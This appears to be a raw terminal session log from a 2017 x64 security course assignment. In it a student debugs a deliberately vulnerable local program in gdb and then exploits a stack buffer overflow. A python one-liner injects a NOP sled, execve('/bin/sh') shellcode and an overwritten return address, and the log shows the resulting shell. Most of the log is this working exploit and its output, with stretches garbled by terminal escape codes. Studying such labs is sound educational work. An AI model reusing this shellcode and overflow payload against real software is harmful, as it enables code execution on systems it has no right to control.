0x7fffffffb4b4:	0x69	0x6e	0x2f	0x73	0x68	0x90	0x90	0x90
0x7fffffffb4bc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0x7fffffffb4c4:	0x90	0x90	0x90	0x90	0x42	0x42	0x42	0x42
0x7fffffffb4cc:	0x00	0x00	0x00	0x00
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) n
Program not restarted.
(gdb) rx/1060xb ($rsp-1060)
[C[C[C[C[C[C[12Pinfo reg
[C[C[C[C[C[Crun $(python -c "print('\x90'*1000+'\xeb\x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x4
48\x89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\x90'*15+'BBBB')")[1P')")[1P')")[1P')")[1P')")\')")x')")3')")4')")\')")x')")b')")4')")\')") [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cx')")
)[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cf')")[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cf')")[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C\')")
x')")
[Cf')")
[C[Cf')")\')")x')")f')")f')")\')")x')")7')")f')")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/hprakash/Desktop/intel/x64/Assignment/vuln $(python -c "print('\x90'*1000+'\xeb\x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+'\x90'*15+'\x34\xb4\xff\xff\xff\x7f')")

Length of Input String:1054


Value of Test:ffffb4a8
Value of filename[0]:ffffb0a0

You are going to need a buffer a little larger than:1032

process 369 is executing new program: /bin/dash
$ 
$ 
$ 
$ 
$ 
$ 
$ 
$ 
$ whoami
hprakash
$ ls
BufferRedirect64.c	    Part4Demo.txt   attack    shellcode.txt  vuln.c
BufferRedirectViaStack64.c  Part4Demo2.txt  attack.c  vuln	     vuln.s
$ exit
[Inferior 1 (process 369) exited normally]
(gdb) quit
]0;hprakash@hprakash-Linux: ~/Desktop/intel/x64/Assignment[01;32mhprakash@hprakash-Linux[00m:[01;34m~/Desktop/intel/x64/Assignment[00m$ 
]0;hprakash@hprakash-Linux: ~/Desktop/intel/x64/Assignment[01;32mhprakash@hprakash-Linux[00m:[01;34m~/Desktop/intel/x64/Assignment[00m$ 
]0;hprakash@hprakash-Linux: ~/Desktop/intel/x64/Assignment[01;32mhprakash@hprakash-Linux[00m:[01;34m~/Desktop/intel/x64/Assignment[00m$ 
]0;hprakash@hprakash-Linux: ~/Desktop/intel/x64/Assignment[01;32mhprakash@hprakash-Linux[00m:[01;34m~/Desktop/intel/x64/Assignment[00m$ 
]0;hprakash@hprakash-Linux: ~/Desktop/intel/x64/Assignment[01;32mhprakash@hprakash-Linux[00m:[01;34m~/Desktop/intel/x64/Assignment[00m$ 
]0;hprakash@hprakash-Linux: ~/Desktop/intel/x64/Assignment[01;32mhprakash@hprakash-Linux[00m:[01;34m~/Desktop/intel/x64/Assignment[00m$ 
]0;hprakash@hprakash-Linux: ~/Desktop/intel/x64/Assignment[01;32mhprakash@hprakash-Linux[00m:[01;34m~/Desktop/intel/x64/Assignment[00m$ 
]0;hprakash@hprakash-Linux: ~/Desktop/intel/x64/Assignment[01;32mhprakash@hprakash-Linux[00m:[01;34m~/Desktop/intel/x64/Assignment[00m$ 
]0;hprakash@hprakash-Linux: ~/Desktop/intel/x64/Assignment[01;32mhprakash@hprakash-Linux[00m:[01;34m~/Desktop/intel/x64/Assignment[00m$ ./vuln $(python -c "print('\x90'*1000+'\xeb\ 
x13\x5f\x48\x31\xc0\x88\x47\x07\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xe8\xff\xff\xff\ 
x2f\x62\x69\x6e\x2f\x73\x68'+'\x90'*15+'\x34\xb4\xff\xff\xff\x7f')")

Length of Input String:1054


Value of Test:ffffb528
Value of filename[0]:ffffb120

You are going to need a buffer a little larger than:1032

$ 
$ 
$ 
$ 
$ 
$ 
$ 
$ 
$ whoami
hprakash
$ ls
BufferRedirect64.c	    Part4Demo.txt   attack    shellcode.txt  vuln.c
BufferRedirectViaStack64.c  Part4Demo2.txt  attack.c  vuln	     vuln.s
$ echo "we have got the shell"
we have got the shell
$ 
$ :)
/bin/sh: 13: Syntax error: ")" unexpected
$ exit
]0;hprakash@hprakash-Linux: ~/Desktop/intel/x64/Assignment[01;32mhprakash@hprakash-Linux[00m:[01;34m~/Desktop/intel/x64/Assignment[00m$ exit
exit

Script done on Fri 31 Mar 2017 05:22:36 AM EDT
